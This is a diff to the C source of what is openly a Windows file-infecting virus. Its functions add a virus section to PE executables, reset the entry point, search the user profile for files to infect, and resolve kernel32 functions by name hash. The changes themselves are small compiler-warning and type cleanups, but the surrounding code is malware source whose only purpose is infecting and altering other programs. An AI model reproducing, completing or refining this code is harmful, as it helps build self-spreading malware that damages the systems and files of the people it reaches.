@@ -3,7 +3,7 @@
 
 #include "everything.h"
 
-void GetFunctionAddresses(const const PDATA data);
+void GetFunctionAddresses(const PDATA data);
 BYTE WINAPI IsValidExecutable(const PVOID file_data);
 BYTE WINAPI Is64BitExecutable(const PVOID file_data);
 BYTE WINAPI IsVirusExistedInFile(const PVOID file_data);
@@ -14,7 +14,6 @@ DWORD GetEntryPoint(PVOID data);
 
 PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD size, const PDATA data);
 void SetEntryPoint(PVOID data, DWORD new_entry_point);
-void ModifyJumpInstructionToVirusCode(PVOID data, DWORD entry_point, DWORD main_addrress);
 
 void WINAPI InfectUserProfile(const PDATA data);
 void WINAPI FindFile(PSTR directory, const PDATA data);
@@ -153,7 +152,7 @@ DWORD GetEntryPoint(PVOID data)
 }
 
 
-PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD section_size, const const PDATA data)
+PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, const PVOID section_data, DWORD section_size, const PDATA data)
 {
     PIMAGE_DOS_HEADER p_image_dos_header;
     PIMAGE_SECTION_HEADER p_image_section_header;
@@ -233,12 +232,9 @@ PIMAGE_SECTION_HEADER GetCurrentVirusSection(PVOID mem_data)
     PIMAGE_DOS_HEADER p_image_dos_header;
     PIMAGE_SECTION_HEADER p_image_section_header;
 
-    DWORD file_alignment, section_alignment;
     ULONG number_of_sections;
 
     DWORD entry_address = 0;
-
-    char virus_name[6];
 
     p_image_dos_header = (PIMAGE_DOS_HEADER)mem_data;
     if (Is64BitExecutable(mem_data))
@@ -259,7 +255,7 @@ PIMAGE_SECTION_HEADER GetCurrentVirusSection(PVOID mem_data)
 
     }
 
-    for (int i = 0; i < number_of_sections; i++)
+    for (unsigned int i = 0; i < number_of_sections; i++)
     {
         if (p_image_section_header[i].VirtualAddress <= entry_address && 
             entry_address <= p_image_section_header[i].VirtualAddress + p_image_section_header[i].Misc.VirtualSize)
@@ -321,7 +317,7 @@ void WINAPI FindFile(PSTR directory, const PDATA data)
 
 void WINAPI InfectUserProfile(const PDATA data)
 {
-    //InfectFile("E:\\Code\\C++\\1.exe", data);
+    //InfectFile((PSTR)"E:\\Code\\C++\\1.exe", data);
     //return;
     char user_profile[1024];
     char user_profile_str[12];
@@ -393,7 +389,7 @@ void GetFunctionAddresses(const PDATA data)
 
     PUSHORT ordinal = (PUSHORT)((PUCHAR)kernel32_base + p_image_export_directory->AddressOfNameOrdinals);
 
-    for(int i = 0; i < p_image_export_directory->NumberOfNames; i++)
+    for(unsigned int i = 0; i < p_image_export_directory->NumberOfNames; i++)
     {
         PUCHAR ptr = (PUCHAR)kernel32_base + name[i]; // Pointer to function name
         DWORD hash = 0;
